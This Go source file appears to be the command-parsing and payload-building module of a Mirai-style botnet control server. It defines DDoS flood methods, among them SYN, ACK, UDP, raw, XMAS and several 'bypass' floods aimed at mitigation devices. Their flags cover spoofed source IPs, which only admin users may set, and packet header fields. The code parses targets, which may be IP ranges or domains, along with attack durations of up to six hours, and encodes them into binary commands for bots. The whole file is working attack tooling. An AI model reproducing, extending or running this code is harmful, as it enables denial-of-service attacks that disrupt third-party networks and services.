package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 // Prefix/netmask
	Flags    map[uint8]string // key=value
	Domain   string           // Домен для HTTP-атак
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"size":      {0, "Size of packet data, default is 512 bytes"},
	"rand":      {1, "Randomize packet data content, default is 1 (yes)"},
	"tos":       {2, "TOS field value in IP header, default is 0"},
	"ident":     {3, "ID field value in IP header, default is random"},
	"ttl":       {4, "TTL field in IP header, default is 255"},
	"df":        {5, "Set the Dont-Fragment bit in IP header, default is 0 (no)"},
	"sport":     {6, "Source port, default is random"},
	"port":      {7, "Destination port, default is random"},
	"domain":    {8, "Domain name to attack"},
	"dhid":      {9, "Domain name transaction ID, default is random"},
	"urg":       {11, "Set the URG bit in IP header, default is 0 (no)"},
	"ack":       {12, "Set the ACK bit in IP header, default is 0 (no) except for ACK flood"},
	"psh":       {13, "Set the PSH bit in IP header, default is 0 (no)"},
	"rst":       {14, "Set the RST bit in IP header, default is 0 (no)"},
	"syn":       {15, "Set the SYN bit in IP header, default is 0 (no) except for SYN flood"},
	"fin":       {16, "Set the FIN bit in IP header, default is 0 (no)"},
	"seqnum":    {17, "Sequence number value in TCP header, default is random"},
	"acknum":    {18, "Ack number value in TCP header, default is random"},
	"gcip":      {19, "Set internal IP to destination ip, default is 0 (no)"},
	"method":    {20, "HTTP method name, default is get"},
	"postdata":  {21, "POST data, default is empty/none"},
	"path":      {22, "HTTP path, default is /"},
	"ssl":       {23, "Use HTTPS/SSL"},
	"threads":   {24, "Number of threads (replaces conns)"},
	"source":    {25, "Source IP address, 255.255.255.255 for random"},
	"minlen":    {26, "min len"},
	"maxlen":    {27, "max len"},
	"payload":   {28, "custom payload"},
	"repeat":    {29, "number of times to repeat"},
	"ratelimit": {30, "Rate limit for requests per second"},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"handshake": {0, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "stomp/handshake flood to bypass mitigation devices"},
	"udp":       {1, []uint8{0, 1, 7}, "UDP Flooding, DGRAM UDP with less PPS Speed"},
	"std":       {2, []uint8{0, 1, 7}, "std flood (uid1 supported)"},
	"tcp":       {3, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP flood (urg,ack,syn)"},
	"ack":       {4, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood optimized for higher GBPS"},
	"syn":       {5, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "SYN flood optimized for higher GBPS"},
	"hex":       {6, []uint8{0, 1, 7}, "HEX flood"},
	"stdhex":    {7, []uint8{0, 6, 7}, "STDHEX flood"},
	"nudp":      {8, []uint8{0, 6, 7}, "NUDP flood"},
	"udphex":    {9, []uint8{8, 7, 20, 21, 22, 24}, "UDPHEX flood"},
	"xmas":      {10, []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16}, "XMAS RTCP Flag Flood"},
	"bypass":    {11, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "strong tcp bypass"},
	"raw":       {12, []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 29}, "raw udp flood"},
	"cudp":      {13, []uint8{0, 1, 7, 26, 27, 28, 29}, "udp flood with custom payload"},
    "ovhtcp":      {13, []uint8{0, 1, 7, 26, 27, 28, 29}, "ovhtcp bypass new (test)"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string), ""}
    args, _ := shellwords.Parse(str)

    var atkInfo AttackInfo
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack name")
    }
    if args[0] == "?" {
        validCmdList := "\x1b[0;36mavailable methods:\r\n\x1b[1;35m"
        for cmdName, atkInfo := range attackInfoLookup {
            validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
        }
        return nil, errors.New(validCmdList)
    }
    var exists bool
    atkInfo, exists = attackInfoLookup[args[0]]
    if !exists {
        return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid command!", args[0]))
    }
    atk.Type = atkInfo.attackID
    args = args[1:]

    if len(args) == 0 {
        return nil, errors.New("Must specify a domain or IP as target")
    }
    if args[0] == "?" {
        return nil, errors.New("\033[37;1mTarget domain or IP\r\nEx: lox.com\r\nEx: http://example.com\r\nEx: 192.168.1.0/24")
    }
    target := args[0]
    prefix := ""
    netmask := uint8(32)

    var scheme, host, portStr string
    if strings.Contains(target, "/") && !strings.Contains(target, "://") {
        ipNetParts := strings.SplitN(target, "/", 2)
        ip := net.ParseIP(ipNetParts[0])
        if ip == nil {
            return nil, fmt.Errorf("Invalid IP: %s", ipNetParts[0])
        }
        mask, err := strconv.Atoi(ipNetParts[1])
        if err != nil || mask < 0 || mask > 32 {
            return nil, fmt.Errorf("Invalid netmask: %s", ipNetParts[1])
        }
        prefix = ipNetParts[0]
        netmask = uint8(mask)
        atk.Targets[binary.BigEndian.Uint32(ip.To4())] = netmask
        atk.Domain = "" 
    } else {
        domain := target
        if strings.Contains(domain, "://") {
            urlParts := strings.SplitN(domain, "://", 2)
            scheme = strings.ToLower(urlParts[0])
            hostPort := urlParts[1]

            if strings.Contains(hostPort, ":") {
                host, portStr, _ = net.SplitHostPort(hostPort)
            } else {
                host = hostPort
                switch scheme {
                case "http":
                    portStr = "80"
                case "https":
                    portStr = "443"
                }
            }
            if scheme == "https" {
                atk.Flags[23] = "1"
            }
            if portStr != "" {
                atk.Flags[7] = portStr
            }
        } else {
            host = domain
        }
        atk.Domain = host

        if atk.Type != 17 && atk.Type != 18 { 
            ips, err := net.LookupIP(host)
            if err != nil || len(ips) == 0 {
                return nil, fmt.Errorf("DNS error: %s", host)
            }
            prefix = ips[0].String()
            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, fmt.Errorf("Invalid IP: %s", prefix)
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
    }
    args = args[1:]

    if len(args) == 0 {
        return nil, errors.New("Must specify an attack duration")
    }
    if args[0] == "?" {
        return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
    }
    duration, err := strconv.Atoi(args[0])
    if err != nil || duration == 0 || duration > 21600 {
        return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 21600 seconds", args[0]))
    }
    atk.Duration = uint32(duration)
    args = args[1:]

    switch atk.Type {
    case 18: 
        if len(args) < 2 {
            return nil, errors.New("Must specify threads and ratelimit for browser attack")
        }
        threads, err := strconv.Atoi(args[0])
        if err != nil || threads <= 0 {
            return nil, errors.New(fmt.Sprintf("Invalid threads value: %s", args[0]))
        }
        atk.Flags[24] = strconv.Itoa(threads)

        ratelimit, err := strconv.Atoi(args[1])
        if err != nil || ratelimit < 0 {
            return nil, errors.New(fmt.Sprintf("Invalid ratelimit value: %s", args[1]))
        }
        atk.Flags[30] = strconv.Itoa(ratelimit)
        args = args[2:]

    case 17: // httpflood
        if len(args) < 1 || !strings.HasPrefix(args[0], "port=") {
            return nil, errors.New("Must specify port=<port> for httpflood attack")
        }
        portSplit := strings.SplitN(args[0], "=", 2)
        if len(portSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid port format: %s", args[0]))
        }
        port, err := strconv.Atoi(portSplit[1])
        if err != nil || port <= 0 || port > 65535 {
            return nil, errors.New(fmt.Sprintf("Invalid port value: %s", portSplit[1]))
        }
        atk.Flags[7] = portSplit[1]
        args = args[1:]
    }

    for len(args) > 0 {
        if args[0] == "?" {
            validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
                        break
                    }
                }
            }
            return nil, errors.New(validFlags)
        }
        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
        }
        flagInfo, exists := flagInfoLookup[flagSplit[0]]
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
        }
        if flagSplit[1][0] == '"' {
            flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
        }
        if flagSplit[1] == "true" {
            flagSplit[1] = "1"
        } else if flagSplit[1] == "false" {
            flagSplit[1] = "0"
        }
        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
        args = args[1:]
    }

    if atk.Domain != "" && atk.Flags[8] == "" {
        atk.Flags[8] = atk.Domain
    }

    return atk, nil
}
func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)
    var tmp []byte

    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    buf = append(buf, byte(this.Type))


    if this.Type == 17 || this.Type == 18 { 
        buf = append(buf, byte(1)) 
        if this.Domain == "" {
            return nil, errors.New("Domain is required for HTTP-based attacks")
        }

        domainBytes := []byte(this.Domain)
        if len(domainBytes) > 255 {
            return nil, errors.New("Domain length cannot exceed 255 bytes")
        }

        tmp = make([]byte, 5)
        tmp[0] = 0xFF 
        tmp[1] = 0
        tmp[2] = 0
        tmp[3] = 0
        tmp[4] = byte(len(domainBytes))
        buf = append(buf, tmp...)
        buf = append(buf, domainBytes...)
    } else {
        buf = append(buf, byte(len(this.Targets)))
        for prefix, netmask := range this.Targets {
            tmp = make([]byte, 5)
            binary.BigEndian.PutUint32(tmp, prefix)
            tmp[4] = byte(netmask)
            buf = append(buf, tmp...)
        }
    }

    buf = append(buf, byte(len(this.Flags)))
    for key, val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("Flag value cannot be more than 255 bytes!")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    if len(buf) > 4096 {
        return nil, errors.New("Max buffer is 4096")
    }

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
    buf = append(tmp, buf...)

    return buf, nil
}